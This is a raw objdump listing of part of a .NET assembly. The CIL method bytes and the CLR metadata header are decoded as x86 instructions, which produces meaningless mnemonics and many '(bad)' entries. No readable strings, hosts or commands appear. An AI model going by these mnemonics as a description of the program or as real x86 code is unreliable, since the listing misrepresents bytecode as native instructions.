  406a00:	1b 30                	sbb    (%eax),%esi
  406a02:	05 00 f7 00 00       	add    $0xf700,%eax
  406a07:	00 3e                	add    %bh,(%esi)
  406a09:	00 00                	add    %al,(%eax)
  406a0b:	11 02                	adc    %eax,(%edx)
  406a0d:	7b bb                	jnp    0x4069ca
  406a0f:	00 00                	add    %al,(%eax)
  406a11:	04 0a                	add    $0xa,%al
  406a13:	06                   	push   %es
  406a14:	2c 41                	sub    $0x41,%al
  406a16:	28 59 00             	sub    %bl,0x0(%ecx)
  406a19:	00 0a                	add    %cl,(%edx)
  406a1b:	6f                   	outsl  %ds:(%esi),(%dx)
  406a1c:	5a                   	pop    %edx
  406a1d:	00 00                	add    %al,(%eax)
  406a1f:	0a 28                	or     (%eax),%ch
  406a21:	76 00                	jbe    0x406a23
  406a23:	00 06                	add    %al,(%esi)
  406a25:	6f                   	outsl  %ds:(%esi),(%dx)
  406a26:	37                   	aaa
  406a27:	00 00                	add    %al,(%eax)
  406a29:	0a 0b                	or     (%ebx),%cl
  406a2b:	12 01                	adc    (%ecx),%al
  406a2d:	28 38                	sub    %bh,(%eax)
  406a2f:	00 00                	add    %al,(%eax)
  406a31:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  406a37:	0a 7d bb             	or     -0x45(%ebp),%bh
  406a3a:	00 00                	add    %al,(%eax)
  406a3c:	04 02                	add    $0x2,%al
  406a3e:	07                   	pop    %es
  406a3f:	7d bd                	jge    0x4069fe
  406a41:	00 00                	add    %al,(%eax)
  406a43:	04 02                	add    $0x2,%al
  406a45:	7c bc                	jl     0x406a03
  406a47:	00 00                	add    %al,(%eax)
  406a49:	04 12                	add    $0x12,%al
  406a4b:	01 02                	add    %eax,(%edx)
  406a4d:	28 4a 00             	sub    %cl,0x0(%edx)
  406a50:	00 2b                	add    %ch,(%ebx)
  406a52:	dd ab 00 00 00 02    	(bad) 0x2000000(%ebx)
  406a58:	7b bd                	jnp    0x406a17
  406a5a:	00 00                	add    %al,(%eax)
  406a5c:	04 0b                	add    $0xb,%al
  406a5e:	02 7c bd 00          	add    0x0(%ebp,%edi,4),%bh
  406a62:	00 04 fe             	add    %al,(%esi,%edi,8)
  406a65:	15 0a 00 00 01       	adc    $0x100000a,%eax
  406a6a:	02 15 25 0a 7d bb    	add    0xbb7d0a25,%dl
  406a70:	00 00                	add    %al,(%eax)
  406a72:	04 12                	add    $0x12,%al
  406a74:	01 28                	add    %ebp,(%eax)
  406a76:	39 00                	cmp    %eax,(%eax)
  406a78:	00 0a                	add    %cl,(%edx)
  406a7a:	73 15                	jae    0x406a91
  406a7c:	01 00                	add    %eax,(%eax)
  406a7e:	0a 25 28 27 00 00    	or     0x2728,%ah
  406a84:	0a 72 28             	or     0x28(%edx),%dh
  406a87:	10 00                	adc    %al,(%eax)
  406a89:	70 28                	jo     0x406ab3
  406a8b:	16                   	push   %ss
  406a8c:	01 00                	add    %eax,(%eax)
  406a8e:	0a 6f 28             	or     0x28(%edi),%ch
  406a91:	00 00                	add    %al,(%eax)
  406a93:	0a 28                	or     (%eax),%ch
  406a95:	59                   	pop    %ecx
  406a96:	00 00                	add    %al,(%eax)
  406a98:	0a 6f 5a             	or     0x5a(%edi),%ch
  406a9b:	00 00                	add    %al,(%eax)
  406a9d:	0a 72 70             	or     0x70(%edx),%dh
  406aa0:	0f 00                	(bad)
  406aa2:	70 28                	jo     0x406acc
  406aa4:	6b 00 00             	imul   $0x0,(%eax),%eax
  406aa7:	0a 6f 01             	or     0x1(%edi),%ch
  406aaa:	01 00                	add    %eax,(%eax)
  406aac:	0a 25 17 6f 17 01    	or     0x1176f17,%ah
  406ab2:	00 0a                	add    %cl,(%edx)
  406ab4:	25 17 6f 04 01       	and    $0x1046f17,%eax
  406ab9:	00 0a                	add    %cl,(%edx)
  406abb:	25 72 8a 10 00       	and    $0x108a72,%eax
  406ac0:	70 6f                	jo     0x406b31
  406ac2:	00 01                	add    %al,(%ecx)
  406ac4:	00 0a                	add    %cl,(%edx)
  406ac6:	28 18                	sub    %bl,(%eax)
  406ac8:	01 00                	add    %eax,(%eax)
  406aca:	0a 26                	or     (%esi),%ah
  406acc:	28 57 00             	sub    %dl,0x0(%edi)
  406acf:	00 0a                	add    %cl,(%edx)
  406ad1:	6f                   	outsl  %ds:(%esi),(%dx)
  406ad2:	58                   	pop    %eax
  406ad3:	00 00                	add    %al,(%eax)
  406ad5:	0a de                	or     %dh,%bl
  406ad7:	17                   	pop    %ss
  406ad8:	0c 02                	or     $0x2,%al
  406ada:	1f                   	pop    %ds
  406adb:	fe                   	(bad)
  406adc:	7d bb                	jge    0x406a99
  406ade:	00 00                	add    %al,(%eax)
  406ae0:	04 02                	add    $0x2,%al
  406ae2:	7c bc                	jl     0x406aa0
  406ae4:	00 00                	add    %al,(%eax)
  406ae6:	04 08                	add    $0x8,%al
  406ae8:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  406aee:	13 02                	adc    (%edx),%eax
  406af0:	1f                   	pop    %ds
  406af1:	fe                   	(bad)
  406af2:	7d bb                	jge    0x406aaf
  406af4:	00 00                	add    %al,(%eax)
  406af6:	04 02                	add    $0x2,%al
  406af8:	7c bc                	jl     0x406ab6
  406afa:	00 00                	add    %al,(%eax)
  406afc:	04 28                	add    $0x28,%al
  406afe:	3e 00 00             	add    %al,%ds:(%eax)
  406b01:	0a 2a                	or     (%edx),%ch
  406b03:	00 01                	add    %al,(%ecx)
  406b05:	10 00                	adc    %al,(%eax)
  406b07:	00 00                	add    %al,(%eax)
  406b09:	00 07                	add    %al,(%edi)
  406b0b:	00 c5                	add    %al,%ch
  406b0d:	cc                   	int3
  406b0e:	00 17                	add    %dl,(%edi)
  406b10:	0b 00                	or     (%eax),%eax
  406b12:	00 01                	add    %al,(%ecx)
  406b14:	1b 30                	sbb    (%eax),%esi
  406b16:	05 00 55 00 00       	add    $0x5500,%eax
  406b1b:	00 3f                	add    %bh,(%edi)
  406b1d:	00 00                	add    %al,(%eax)
  406b1f:	11 72 cc             	adc    %esi,-0x34(%edx)
  406b22:	0f 00                	(bad)
  406b24:	70 0a                	jo     0x406b30
  406b26:	20 01                	and    %al,(%ecx)
  406b28:	00 00                	add    %al,(%eax)
  406b2a:	80 20 00             	andb   $0x0,(%eax)
  406b2d:	01 00                	add    %eax,(%eax)
  406b2f:	00 28                	add    %ch,(%eax)
  406b31:	0e                   	push   %cs
  406b32:	01 00                	add    %eax,(%eax)
  406b34:	0a 06                	or     (%esi),%al
  406b36:	17                   	pop    %ss
  406b37:	6f                   	outsl  %ds:(%esi),(%dx)
  406b38:	0f 01 00             	sgdtl  (%eax)
  406b3b:	0a 0b                	or     (%ebx),%cl
  406b3d:	07                   	pop    %es
  406b3e:	02 7b be             	add    -0x42(%ebx),%bh
  406b41:	00 00                	add    %al,(%eax)
  406b43:	04 72                	add    $0x72,%al
  406b45:	70 0f                	jo     0x406b56
  406b47:	00 70 02             	add    %dh,0x2(%eax)
  406b4a:	7b bf                	jnp    0x406b0b
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	04 72                	add    $0x72,%al
  406b50:	70 0f                	jo     0x406b61
  406b52:	00 70 28             	add    %dh,0x28(%eax)
  406b55:	6b 00 00             	imul   $0x0,(%eax),%eax
  406b58:	0a 6f 19             	or     0x19(%edi),%ch
  406b5b:	01 00                	add    %eax,(%eax)
  406b5d:	0a de                	or     %dh,%bl
  406b5f:	0a 07                	or     (%edi),%al
  406b61:	2c 06                	sub    $0x6,%al
  406b63:	07                   	pop    %es
  406b64:	6f                   	outsl  %ds:(%esi),(%dx)
  406b65:	4b                   	dec    %ebx
  406b66:	00 00                	add    %al,(%eax)
  406b68:	0a dc                	or     %ah,%bl
  406b6a:	17                   	pop    %ss
  406b6b:	0c de                	or     $0xde,%al
  406b6d:	05 26 16 0c de       	add    $0xde0c1626,%eax
  406b72:	00 08                	add    %cl,(%eax)
  406b74:	2a 00                	sub    (%eax),%al
  406b76:	00 00                	add    %al,(%eax)
  406b78:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  406b7b:	00 02                	add    %al,(%edx)
  406b7d:	00 1d 00 23 40 00    	add    %bl,0x402300
  406b83:	0a 00                	or     (%eax),%al
  406b85:	00 00                	add    %al,(%eax)
  406b87:	00 00                	add    %al,(%eax)
  406b89:	00 06                	add    %al,(%esi)
  406b8b:	00 48 4e             	add    %cl,0x4e(%eax)
  406b8e:	00 05 01 00 00 01    	add    %al,0x1000001
  406b94:	1b 30                	sbb    (%eax),%esi
  406b96:	03 00                	add    (%eax),%eax
  406b98:	b8 00 00 00 40       	mov    $0x40000000,%eax
  406b9d:	00 00                	add    %al,(%eax)
  406b9f:	11 02                	adc    %eax,(%edx)
  406ba1:	7b c0                	jnp    0x406b63
  406ba3:	00 00                	add    %al,(%eax)
  406ba5:	04 0a                	add    $0xa,%al
  406ba7:	06                   	push   %es
  406ba8:	2c 5c                	sub    $0x5c,%al
  406baa:	73 8b                	jae    0x406b37
  406bac:	00 00                	add    %al,(%eax)
  406bae:	06                   	push   %es
  406baf:	25 02 7b c2 00       	and    $0xc27b02,%eax
  406bb4:	00 04 7d be 00 00 04 	add    %al,0x40000be(,%edi,2)
  406bbb:	25 02 7b c3 00       	and    $0xc37b02,%eax
  406bc0:	00 04 7d bf 00 00 04 	add    %al,0x40000bf(,%edi,2)
  406bc7:	fe 06                	incb   (%esi)
  406bc9:	8c 00                	mov    %es,(%eax)
  406bcb:	00 06                	add    %al,(%esi)
  406bcd:	73 1a                	jae    0x406be9
  406bcf:	01 00                	add    %eax,(%eax)
  406bd1:	0a 28                	or     (%eax),%ch
  406bd3:	4b                   	dec    %ebx
  406bd4:	00 00                	add    %al,(%eax)
  406bd6:	2b 6f 2b             	sub    0x2b(%edi),%ebp
  406bd9:	00 00                	add    %al,(%eax)
  406bdb:	0a 0c 12             	or     (%edx,%edx,1),%cl
  406bde:	02 28                	add    (%eax),%ch
  406be0:	2c 00                	sub    $0x0,%al
  406be2:	00 0a                	add    %cl,(%edx)
  406be4:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  406be9:	0a 7d c0             	or     -0x40(%ebp),%bh
  406bec:	00 00                	add    %al,(%eax)
  406bee:	04 02                	add    $0x2,%al
  406bf0:	08 7d c4             	or     %bh,-0x3c(%ebp)
  406bf3:	00 00                	add    %al,(%eax)
  406bf5:	04 02                	add    $0x2,%al
  406bf7:	7c c1                	jl     0x406bba
  406bf9:	00 00                	add    %al,(%eax)
  406bfb:	04 12                	add    $0x12,%al
  406bfd:	02 02                	add    (%edx),%al
  406bff:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  406c03:	2b de                	sub    %esi,%ebx
  406c05:	51                   	push   %ecx
  406c06:	02 7b c4             	add    -0x3c(%ebx),%bh
  406c09:	00 00                	add    %al,(%eax)
  406c0b:	04 0c                	add    $0xc,%al
  406c0d:	02 7c c4 00          	add    0x0(%esp,%eax,8),%bh
  406c11:	00 04 fe             	add    %al,(%esi,%edi,8)
  406c14:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  406c19:	02 15 25 0a 7d c0    	add    0xc07d0a25,%dl
  406c1f:	00 00                	add    %al,(%eax)
  406c21:	04 12                	add    $0x12,%al
  406c23:	02 28                	add    (%eax),%ch
  406c25:	2d 00 00 0a 0b       	sub    $0xb0a0000,%eax
  406c2a:	de 17                	ficoms (%edi)
  406c2c:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  406c31:	c0 00 00             	rolb   $0x0,(%eax)
  406c34:	04 02                	add    $0x2,%al
  406c36:	7c c1                	jl     0x406bf9
  406c38:	00 00                	add    %al,(%eax)
  406c3a:	04 09                	add    $0x9,%al
  406c3c:	28 98 00 00 0a de    	sub    %bl,-0x21f60000(%eax)
  406c42:	14 02                	adc    $0x2,%al
  406c44:	1f                   	pop    %ds
  406c45:	fe                   	(bad)
  406c46:	7d c0                	jge    0x406c08
  406c48:	00 00                	add    %al,(%eax)
  406c4a:	04 02                	add    $0x2,%al
  406c4c:	7c c1                	jl     0x406c0f
  406c4e:	00 00                	add    %al,(%eax)
  406c50:	04 07                	add    $0x7,%al
  406c52:	28 99 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ecx)
  406c58:	01 10                	add    %edx,(%eax)
  406c5a:	00 00                	add    %al,(%eax)
  406c5c:	00 00                	add    %al,(%eax)
  406c5e:	07                   	pop    %es
  406c5f:	00 85 8c 00 17 0b    	add    %al,0xb17008c(%ebp)
  406c65:	00 00                	add    %al,(%eax)
  406c67:	01 1b                	add    %ebx,(%ebx)
  406c69:	30 05 00 b0 01 00    	xor    %al,0x1b000
  406c6f:	00 41 00             	add    %al,0x0(%ecx)
  406c72:	00 11                	add    %dl,(%ecx)
  406c74:	02 7b c5             	add    -0x3b(%ebx),%bh
  406c77:	00 00                	add    %al,(%eax)
  406c79:	04 0a                	add    $0xa,%al
  406c7b:	06                   	push   %es
  406c7c:	26 00 06             	add    %al,%es:(%esi)
  406c7f:	39 0d 01 00 00 72    	cmp    %ecx,0x72000001
  406c85:	9a 10 00 70 02 7b c7 	lcall  $0xc77b,$0x2700010
  406c8c:	00 00                	add    %al,(%eax)
  406c8e:	04 72                	add    $0x72,%al
  406c90:	a1 17 00 70 28       	mov    0x28700017,%eax
  406c95:	6b 00 00             	imul   $0x0,(%eax),%eax
  406c98:	0a 0c 02             	or     (%edx,%eax,1),%cl
  406c9b:	28 1b                	sub    %bl,(%ebx)
  406c9d:	01 00                	add    %eax,(%eax)
  406c9f:	0a 7d c9             	or     -0x37(%ebp),%bh
  406ca2:	00 00                	add    %al,(%eax)
  406ca4:	04 02                	add    $0x2,%al
  406ca6:	7b c9                	jnp    0x406c71
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	04 08                	add    $0x8,%al
  406cac:	28 1c 01             	sub    %bl,(%ecx,%eax,1)
  406caf:	00 0a                	add    %cl,(%edx)
  406cb1:	02 73 fe             	add    -0x2(%ebx),%dh
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	0a 7d ca             	or     -0x36(%ebp),%bh
  406cb9:	00 00                	add    %al,(%eax)
  406cbb:	04 02                	add    $0x2,%al
  406cbd:	7b ca                	jnp    0x406c89
  406cbf:	00 00                	add    %al,(%eax)
  406cc1:	04 6f                	add    $0x6f,%al
  406cc3:	ff 00                	incl   (%eax)
  406cc5:	00 0a                	add    %cl,(%edx)
  406cc7:	72 32                	jb     0x406cfb
  406cc9:	0f 00                	(bad)
  406ccb:	70 6f                	jo     0x406d3c
  406ccd:	00 01                	add    %al,(%ecx)
  406ccf:	00 0a                	add    %cl,(%edx)
  406cd1:	02 7b ca             	add    -0x36(%ebx),%bh
  406cd4:	00 00                	add    %al,(%eax)
  406cd6:	04 6f                	add    $0x6f,%al
  406cd8:	ff 00                	incl   (%eax)
  406cda:	00 0a                	add    %cl,(%edx)
  406cdc:	1b 8d 34 00 00 01    	sbb    0x1000034(%ebp),%ecx
  406ce2:	25 16 72 5a 18       	and    $0x185a7216,%eax
  406ce7:	00 70 a2             	add    %dh,-0x5e(%eax)
  406cea:	25 17 02 7b c8       	and    $0xc87b0217,%eax
  406cef:	00 00                	add    %al,(%eax)
  406cf1:	04 a2                	add    $0xa2,%al
  406cf3:	25 18 72 76 18       	and    $0x18767218,%eax
  406cf8:	00 70 a2             	add    %dh,-0x5e(%eax)
  406cfb:	25 19 02 7b c9       	and    $0xc97b0219,%eax
  406d00:	00 00                	add    %al,(%eax)
  406d02:	04 a2                	add    $0xa2,%al
  406d04:	25 1a 72 88 18       	and    $0x1888721a,%eax
  406d09:	00 70 a2             	add    %dh,-0x5e(%eax)
  406d0c:	28 1d 01 00 0a 6f    	sub    %bl,0x6f0a0001
  406d12:	01 01                	add    %eax,(%ecx)
  406d14:	00 0a                	add    %cl,(%edx)
  406d16:	02 7b ca             	add    -0x36(%ebx),%bh
  406d19:	00 00                	add    %al,(%eax)
  406d1b:	04 6f                	add    $0x6f,%al
  406d1d:	ff 00                	incl   (%eax)
  406d1f:	00 0a                	add    %cl,(%edx)
  406d21:	16                   	push   %ss
  406d22:	6f                   	outsl  %ds:(%esi),(%dx)
  406d23:	02 01                	add    (%ecx),%al
  406d25:	00 0a                	add    %cl,(%edx)
  406d27:	02 7b ca             	add    -0x36(%ebx),%bh
  406d2a:	00 00                	add    %al,(%eax)
  406d2c:	04 6f                	add    $0x6f,%al
  406d2e:	ff 00                	incl   (%eax)
  406d30:	00 0a                	add    %cl,(%edx)
  406d32:	17                   	pop    %ss
  406d33:	6f                   	outsl  %ds:(%esi),(%dx)
  406d34:	03 01                	add    (%ecx),%eax
  406d36:	00 0a                	add    %cl,(%edx)
  406d38:	02 7b ca             	add    -0x36(%ebx),%bh
  406d3b:	00 00                	add    %al,(%eax)
  406d3d:	04 6f                	add    $0x6f,%al
  406d3f:	ff 00                	incl   (%eax)
  406d41:	00 0a                	add    %cl,(%edx)
  406d43:	17                   	pop    %ss
  406d44:	6f                   	outsl  %ds:(%esi),(%dx)
  406d45:	04 01                	add    $0x1,%al
  406d47:	00 0a                	add    %cl,(%edx)
  406d49:	02 7b ca             	add    -0x36(%ebx),%bh
  406d4c:	00 00                	add    %al,(%eax)
  406d4e:	04 6f                	add    $0x6f,%al
  406d50:	05 01 00 0a 26       	add    $0x260a0001,%eax
  406d55:	20 b8 0b 00 00 28    	and    %bh,0x2800000b(%eax)
  406d5b:	5c                   	pop    %esp
  406d5c:	00 00                	add    %al,(%eax)
  406d5e:	0a 6f 37             	or     0x37(%edi),%ch
  406d61:	00 00                	add    %al,(%eax)
  406d63:	0a 0d 12 03 28 38    	or     0x38280312,%cl
  406d69:	00 00                	add    %al,(%eax)
  406d6b:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  406d71:	0a 7d c5             	or     -0x3b(%ebp),%bh
  406d74:	00 00                	add    %al,(%eax)
  406d76:	04 02                	add    $0x2,%al
  406d78:	09 7d cb             	or     %edi,-0x35(%ebp)
  406d7b:	00 00                	add    %al,(%eax)
  406d7d:	04 02                	add    $0x2,%al
  406d7f:	7c c6                	jl     0x406d47
  406d81:	00 00                	add    %al,(%eax)
  406d83:	04 12                	add    $0x12,%al
  406d85:	03 02                	add    (%edx),%eax
  406d87:	28 4d 00             	sub    %cl,0x0(%ebp)
  406d8a:	00 2b                	add    %ch,(%ebx)
  406d8c:	dd 92 00 00 00 02    	fstl   0x2000000(%edx)
  406d92:	7b cb                	jnp    0x406d5f
  406d94:	00 00                	add    %al,(%eax)
  406d96:	04 0d                	add    $0xd,%al
  406d98:	02 7c cb 00          	add    0x0(%ebx,%ecx,8),%bh
  406d9c:	00 04 fe             	add    %al,(%esi,%edi,8)
  406d9f:	15 0a 00 00 01       	adc    $0x100000a,%eax
  406da4:	02 15 25 0a 7d c5    	add    0xc57d0a25,%dl
  406daa:	00 00                	add    %al,(%eax)
  406dac:	04 12                	add    $0x12,%al
  406dae:	03 28                	add    (%eax),%ebp
  406db0:	39 00                	cmp    %eax,(%eax)
  406db2:	00 0a                	add    %cl,(%edx)
  406db4:	02 7b ca             	add    -0x36(%ebx),%bh
  406db7:	00 00                	add    %al,(%eax)
  406db9:	04 6f                	add    $0x6f,%al
  406dbb:	06                   	push   %es
  406dbc:	01 00                	add    %eax,(%eax)
  406dbe:	0a 6f 07             	or     0x7(%edi),%ch
  406dc1:	01 00                	add    %eax,(%eax)
  406dc3:	0a 02                	or     (%edx),%al
  406dc5:	7b c9                	jnp    0x406d90
  406dc7:	00 00                	add    %al,(%eax)
  406dc9:	04 28                	add    $0x28,%al
  406dcb:	1e                   	push   %ds
  406dcc:	01 00                	add    %eax,(%eax)
  406dce:	0a 72 92             	or     -0x6e(%edx),%dh
  406dd1:	18 00                	sbb    %al,(%eax)
  406dd3:	70 6f                	jo     0x406e44
  406dd5:	1f                   	pop    %ds
  406dd6:	01 00                	add    %eax,(%eax)
  406dd8:	0a 2c 04             	or     (%esp,%eax,1),%ch
  406ddb:	17                   	pop    %ss
  406ddc:	0b de                	or     %esi,%ebx
  406dde:	30 02                	xor    %al,(%edx)
  406de0:	14 7d                	adc    $0x7d,%al
  406de2:	c9                   	leave
  406de3:	00 00                	add    %al,(%eax)
  406de5:	04 02                	add    $0x2,%al
  406de7:	14 7d                	adc    $0x7d,%al
  406de9:	ca 00 00             	lret   $0x0
  406dec:	04 de                	add    $0xde,%al
  406dee:	03 26                	add    (%esi),%esp
  406df0:	de 00                	fiadds (%eax)
  406df2:	16                   	push   %ss
  406df3:	0b de                	or     %esi,%ebx
  406df5:	19 13                	sbb    %edx,(%ebx)
  406df7:	04 02                	add    $0x2,%al
  406df9:	1f                   	pop    %ds
  406dfa:	fe                   	(bad)
  406dfb:	7d c5                	jge    0x406dc2
  406dfd:	00 00                	add    %al,(%eax)
  406dff:	04 02                	add    $0x2,%al
  406e01:	7c c6                	jl     0x406dc9
  406e03:	00 00                	add    %al,(%eax)
  406e05:	04 11                	add    $0x11,%al
  406e07:	04 28                	add    $0x28,%al
  406e09:	98                   	cwtl
  406e0a:	00 00                	add    %al,(%eax)
  406e0c:	0a de                	or     %dh,%bl
  406e0e:	14 02                	adc    $0x2,%al
  406e10:	1f                   	pop    %ds
  406e11:	fe                   	(bad)
  406e12:	7d c5                	jge    0x406dd9
  406e14:	00 00                	add    %al,(%eax)
  406e16:	04 02                	add    $0x2,%al
  406e18:	7c c6                	jl     0x406de0
  406e1a:	00 00                	add    %al,(%eax)
  406e1c:	04 07                	add    $0x7,%al
  406e1e:	28 99 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ecx)
  406e24:	41                   	inc    %ecx
  406e25:	34 00                	xor    $0x0,%al
  406e27:	00 00                	add    %al,(%eax)
  406e29:	00 00                	add    %al,(%eax)
  406e2b:	00 0a                	add    %cl,(%edx)
  406e2d:	00 00                	add    %al,(%eax)
  406e2f:	00 71 01             	add    %dh,0x1(%ecx)
  406e32:	00 00                	add    %al,(%eax)
  406e34:	7b 01                	jnp    0x406e37
  406e36:	00 00                	add    %al,(%eax)
  406e38:	03 00                	add    (%eax),%eax
  406e3a:	00 00                	add    %al,(%eax)
  406e3c:	01 00                	add    %eax,(%eax)
  406e3e:	00 01                	add    %al,(%ecx)
  406e40:	00 00                	add    %al,(%eax)
  406e42:	00 00                	add    %al,(%eax)
  406e44:	07                   	pop    %es
  406e45:	00 00                	add    %al,(%eax)
  406e47:	00 7b 01             	add    %bh,0x1(%ebx)
  406e4a:	00 00                	add    %al,(%eax)
  406e4c:	82 01 00             	addb   $0x0,(%ecx)
  406e4f:	00 19                	add    %bl,(%ecx)
  406e51:	00 00                	add    %al,(%eax)
  406e53:	00 0b                	add    %cl,(%ebx)
  406e55:	00 00                	add    %al,(%eax)
  406e57:	01 1b                	add    %ebx,(%ebx)
  406e59:	30 03                	xor    %al,(%ebx)
  406e5b:	00 af 00 00 00 42    	add    %ch,0x42000000(%edi)
  406e61:	00 00                	add    %al,(%eax)
  406e63:	11 02                	adc    %eax,(%edx)
  406e65:	7b cc                	jnp    0x406e33
  406e67:	00 00                	add    %al,(%eax)
  406e69:	04 0a                	add    $0xa,%al
  406e6b:	06                   	push   %es
  406e6c:	2c 53                	sub    $0x53,%al
  406e6e:	7e a9                	jle    0x406e19
  406e70:	00 00                	add    %al,(%eax)
  406e72:	04 25                	add    $0x25,%al
  406e74:	2d 17 26 7e a7       	sub    $0xa77e2617,%eax
  406e79:	00 00                	add    %al,(%eax)
  406e7b:	04 fe                	add    $0xfe,%al
  406e7d:	06                   	push   %es
  406e7e:	80 00 00             	addb   $0x0,(%eax)
  406e81:	06                   	push   %es
  406e82:	73 20                	jae    0x406ea4
  406e84:	01 00                	add    %eax,(%eax)
  406e86:	0a 25 80 a9 00 00    	or     0xa980,%ah
  406e8c:	04 28                	add    $0x28,%al
  406e8e:	4e                   	dec    %esi
  406e8f:	00 00                	add    %al,(%eax)
  406e91:	2b 6f 67             	sub    0x67(%edi),%ebp
  406e94:	00 00                	add    %al,(%eax)
  406e96:	0a 0c 12             	or     (%edx,%edx,1),%cl
  406e99:	02 28                	add    (%eax),%ch
  406e9b:	68 00 00 0a 2d       	push   $0x2d0a0000
  406ea0:	3c 02                	cmp    $0x2,%al
  406ea2:	16                   	push   %ss
  406ea3:	25 0a 7d cc 00       	and    $0xcc7d0a,%eax
  406ea8:	00 04 02             	add    %al,(%edx,%eax,1)
  406eab:	08 7d ce             	or     %bh,-0x32(%ebp)
  406eae:	00 00                	add    %al,(%eax)
  406eb0:	04 02                	add    $0x2,%al
  406eb2:	7c cd                	jl     0x406e81
  406eb4:	00 00                	add    %al,(%eax)
  406eb6:	04 12                	add    $0x12,%al
  406eb8:	02 02                	add    (%edx),%al
  406eba:	28 4f 00             	sub    %cl,0x0(%edi)
  406ebd:	00 2b                	add    %ch,(%ebx)
  406ebf:	de 51 02             	ficoms 0x2(%ecx)
  406ec2:	7b ce                	jnp    0x406e92
  406ec4:	00 00                	add    %al,(%eax)
  406ec6:	04 0c                	add    $0xc,%al
  406ec8:	02 7c ce 00          	add    0x0(%esi,%ecx,8),%bh
  406ecc:	00 04 fe             	add    %al,(%esi,%edi,8)
  406ecf:	15 0c 00 00 1b       	adc    $0x1b00000c,%eax
  406ed4:	02 15 25 0a 7d cc    	add    0xcc7d0a25,%dl
  406eda:	00 00                	add    %al,(%eax)
  406edc:	04 12                	add    $0x12,%al
  406ede:	02 28                	add    (%eax),%ch
  406ee0:	69 00 00 0a 0b de    	imul   $0xde0b0a00,(%eax),%eax
  406ee6:	17                   	pop    %ss
  406ee7:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  406eec:	cc                   	int3
  406eed:	00 00                	add    %al,(%eax)
  406eef:	04 02                	add    $0x2,%al
  406ef1:	7c cd                	jl     0x406ec0
  406ef3:	00 00                	add    %al,(%eax)
  406ef5:	04 09                	add    $0x9,%al
  406ef7:	28 22                	sub    %ah,(%edx)
  406ef9:	01 00                	add    %eax,(%eax)
  406efb:	0a de                	or     %dh,%bl
  406efd:	14 02                	adc    $0x2,%al
  406eff:	1f                   	pop    %ds
  406f00:	fe                   	(bad)
  406f01:	7d cc                	jge    0x406ecf
  406f03:	00 00                	add    %al,(%eax)
  406f05:	04 02                	add    $0x2,%al
  406f07:	7c cd                	jl     0x406ed6
  406f09:	00 00                	add    %al,(%eax)
  406f0b:	04 07                	add    $0x7,%al
  406f0d:	28 23                	sub    %ah,(%ebx)
  406f0f:	01 00                	add    %eax,(%eax)
  406f11:	0a 2a                	or     (%edx),%ch
  406f13:	00 01                	add    %al,(%ecx)
  406f15:	10 00                	adc    %al,(%eax)
  406f17:	00 00                	add    %al,(%eax)
  406f19:	00 07                	add    %al,(%edi)
  406f1b:	00 7c 83 00          	add    %bh,0x0(%ebx,%eax,4)
  406f1f:	17                   	pop    %ss
  406f20:	0b 00                	or     (%eax),%eax
  406f22:	00 01                	add    %al,(%ecx)
  406f24:	42                   	inc    %edx
  406f25:	53                   	push   %ebx
  406f26:	4a                   	dec    %edx
  406f27:	42                   	inc    %edx
  406f28:	01 00                	add    %eax,(%eax)
  406f2a:	01 00                	add    %eax,(%eax)
  406f2c:	00 00                	add    %al,(%eax)
  406f2e:	00 00                	add    %al,(%eax)
  406f30:	0c 00                	or     $0x0,%al
  406f32:	00 00                	add    %al,(%eax)
  406f34:	76 34                	jbe    0x406f6a
  406f36:	2e 30 2e             	xor    %ch,%cs:(%esi)
  406f39:	33 30                	xor    (%eax),%esi
  406f3b:	33 31                	xor    (%ecx),%esi
  406f3d:	39 00                	cmp    %eax,(%eax)
  406f3f:	00 00                	add    %al,(%eax)
  406f41:	00 05 00 6c 00 00    	add    %al,0x6c00
  406f47:	00 2c 24             	add    %ch,(%esp)
  406f4a:	00 00                	add    %al,(%eax)
  406f4c:	23 7e 00             	and    0x0(%esi),%edi
  406f4f:	00 98 24 00 00 70    	add    %bl,0x70000024(%eax)
  406f55:	1b 00                	sbb    (%eax),%eax
  406f57:	00 23                	add    %ah,(%ebx)
  406f59:	53                   	push   %ebx
  406f5a:	74 72                	je     0x406fce
  406f5c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  406f63:	00 08                	add    %cl,(%eax)
  406f65:	40                   	inc    %eax
  406f66:	00 00                	add    %al,(%eax)
  406f68:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406f69:	18 00                	sbb    %al,(%eax)
  406f6b:	00 23                	add    %ah,(%ebx)
  406f6d:	55                   	push   %ebp
  406f6e:	53                   	push   %ebx
  406f6f:	00 ac 58 00 00 10 00 	add    %ch,0x100000(%eax,%ebx,2)
  406f76:	00 00                	add    %al,(%eax)
  406f78:	23 47 55             	and    0x55(%edi),%eax
  406f7b:	49                   	dec    %ecx
  406f7c:	44                   	inc    %esp
  406f7d:	00 00                	add    %al,(%eax)
  406f7f:	00 bc 58 00 00 78 12 	add    %bh,0x12780000(%eax,%ebx,2)
  406f86:	00 00                	add    %al,(%eax)
  406f88:	23 42 6c             	and    0x6c(%edx),%eax
  406f8b:	6f                   	outsl  %ds:(%esi),(%dx)
  406f8c:	62 00                	bound  %eax,(%eax)
  406f8e:	00 00                	add    %al,(%eax)
  406f90:	00 00                	add    %al,(%eax)
  406f92:	00 00                	add    %al,(%eax)
  406f94:	02 00                	add    (%eax),%al
  406f96:	00 01                	add    %al,(%ecx)
  406f98:	57                   	push   %edi
  406f99:	bf a2 3f 09 0a       	mov    $0xa093fa2,%edi
  406f9e:	00 00                	add    %al,(%eax)
  406fa0:	00 fa                	add    %bh,%dl
  406fa2:	25 33 00 16 00       	and    $0x160033,%eax
  406fa7:	00 01                	add    %al,(%ecx)
  406fa9:	00 00                	add    %al,(%eax)
